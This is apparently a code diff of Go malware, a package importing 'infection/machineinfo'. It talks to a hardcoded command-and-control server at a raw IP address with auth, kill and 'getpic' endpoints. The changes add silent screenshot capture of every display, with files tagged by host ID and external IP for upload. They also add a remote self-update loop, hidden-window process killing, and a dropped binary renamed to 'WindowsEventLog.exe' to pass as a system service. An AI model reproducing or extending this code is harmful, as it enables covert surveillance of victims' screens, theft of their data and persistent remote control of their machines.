@@ -2,9 +2,12 @@ package lib
 
 import (
 	"bytes"
+	"encoding/json"
 	"fmt"
 	"github.com/inconshreveable/go-update"
+	"github.com/kbinani/screenshot"
 	"github.com/parnurzeal/gorequest"
+	"image/png"
 	"infection/machineinfo"
 	"io"
 	"io/ioutil"
@@ -15,27 +18,38 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"path/filepath"
+	"runtime"
 	"strings"
 	"syscall"
 	"time"
 )
 
-const VERSION string = "3"
+const VERSION string = "1"
 const MIDURL string = "http://111.231.82.173/"
 const MIDFILE string = "http://111.231.82.173/file/"
 const MIDAUTH string = "http://111.231.82.173:9000/auth"
 const MIDETCD string = "111.231.82.173:2379"
 const MIDKILLIP string = "http://111.231.82.173:9000/Killip"
 const ALLKILL string = "http://111.231.82.173:9000/Allkill"
+const GETSCREEN string = "http://111.231.82.173:9000/getpic"
 const CURRENTPATHLOG = "C:\\Windows\\Temp\\log.txt"
 const CURRENTPATH = "C:\\Windows\\Temp\\"
+const NOGUILOG = "C:\\Windows\\Temp\\nogui.txt"
 
 var HOSTID = machineinfo.GetSystemVersion().Hostid
 var BrowserSafepath = get_current_user() + "\\tmp\\"
+var OUTIP string
 
 type Msg struct {
 	Hostid string `json:"hostid"`
 	Code   int    `json:"code"`
+}
+
+// get out ip
+func GetOutIp() {
+	body, _ := ioutil.ReadFile(CURRENTPATH + "ip.txt")
+	OUTIP = strings.TrimSpace(string(body))
 }
 
 func get_current_user() string {
@@ -50,11 +64,12 @@ func RandInt64(min, max int64) int {
 	return int(min + rand.Int63n(max-min+1))
 }
 
-func DoUpdate() error {
+//ioop check version update
+func DoUpdate() {
 	for {
-		resp, err := http.Get(MIDFILE + "version.txt")
+		resp, err := http.Get(MIDFILE + "noguiversion.txt")
 		if err != nil {
-			return err
+			log.Println(err)
 		}
 		body, _ := ioutil.ReadAll(resp.Body)
 		defer resp.Body.Close()
@@ -65,11 +80,13 @@ func DoUpdate() error {
 			if err != nil {
 				// error handling
 			}
+			time.Sleep(2 * time.Second)
+			// when update done shlb be kill main process
+			KillMain()
 		} else {
-			//fmt.Println(string(body))
+			//
 			time.Sleep(time.Duration(RandInt64(300, 1000)))
 		}
-		return err
 	}
 }
 func SingleFile(file string, addr string, finflag chan string) {
@@ -102,6 +119,24 @@ func SingleFile(file string, addr string, finflag chan string) {
 	finflag <- "file sent"
 	return
 }
+func GetTargetPath() (string, error) {
+	file, err := exec.LookPath(os.Args[0])
+	if err != nil {
+		return "", err
+	}
+	path, err := filepath.Abs(file)
+	if err != nil {
+		return "", err
+	}
+	i := strings.LastIndex(path, "/")
+	if i < 0 {
+		i = strings.LastIndex(path, "\\")
+	}
+	if i < 0 {
+		return "", fmt.Errorf(`error: Can't find "/" or "\".`)
+	}
+	return string(path), nil
+}
 
 func Removetempimages(filenames []string, finflag chan string) {
 	for _, name := range filenames {
@@ -110,7 +145,7 @@ func Removetempimages(filenames []string, finflag chan string) {
 }
 
 func KillCheck() {
-	killcheck := exec.Command("taskkill", "/f", "/im", "WindowsDaemon.exe")
+	killcheck := exec.Command("taskkill", "/f", "/im", "WindowsEventLog.exe")
 	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	// not Start will continue
 	killcheck.Run()
@@ -123,13 +158,18 @@ func KillALL() {
 	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	killcheck.Run()
 }
-
+func KillMain() {
+	current_file := strings.Split(os.Args[0], "\\")
+	killcheck := exec.Command("taskkill", "/f", "/im", current_file[len(current_file)-1])
+	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	killcheck.Run()
+}
 func MultiFileDown(files []string, step string) {
 	if len(files) == 0 && step == "init" {
 		var fileinit = []struct {
 			Name string
 		}{
-			{"WindowsDaemon.exe"},
+			{"WindowsEventLog.exe"},
 			{"sqlite3_386.dll"},
 			{"sqlite3_amd64.dll"},
 		}
@@ -146,6 +186,28 @@ func Get(url string, file string) {
 	}
 	body, _ := ioutil.ReadAll(resp.Body)
 	ioutil.WriteFile(CURRENTPATH+file, body, 0644)
+}
+
+type Check struct {
+	Hostid string `json:"hostid"`
+}
+
+func CheckInlib(addr string) error {
+	var check Check
+	resp, body, _ := gorequest.New().
+		Get("http://" + addr + ":5002/machine/machineCheck").
+		End()
+	if resp.StatusCode == 200 && body != "" {
+		if err := json.Unmarshal([]byte(body), &check); err == nil {
+			if check.Hostid == HOSTID {
+				return nil
+			} else {
+				return fmt.Errorf("not inlib")
+			}
+
+		}
+	}
+	return fmt.Errorf("not inlib")
 }
 
 func FileExits(path string) error {
@@ -166,6 +228,35 @@ func ErrorStatusCode(code int, hostid string, addr string) {
 		Set("content-type", "application/x-www-form-urlencoded").
 		Send(msg).
 		End()
+}
+
+//get hostid-ip-screensize pic
+func Getscreenshot() []string {
+	n := screenshot.NumActiveDisplays()
+	filenames := []string{}
+	var fpth string
+	for i := 0; i < n; i++ {
+		bounds := screenshot.GetDisplayBounds(i)
+
+		img, err := screenshot.CaptureRect(bounds)
+		if err != nil {
+			panic(err)
+		}
+		if runtime.GOOS == "windows" {
+			fpth = `C:\Windows\Temp\`
+		} else {
+			fpth = `/tmp/`
+		}
+		GetOutIp()
+		fileName := fmt.Sprintf("%s-%s-%d-%dx%d.png", HOSTID, OUTIP, i, bounds.Dx(), bounds.Dy())
+		fullpath := fpth + fileName
+		filenames = append(filenames, fullpath)
+		file, _ := os.Create(fullpath)
+
+		defer file.Close()
+		png.Encode(file, img)
+	}
+	return filenames
 }
 
 //func SystemCheck(){
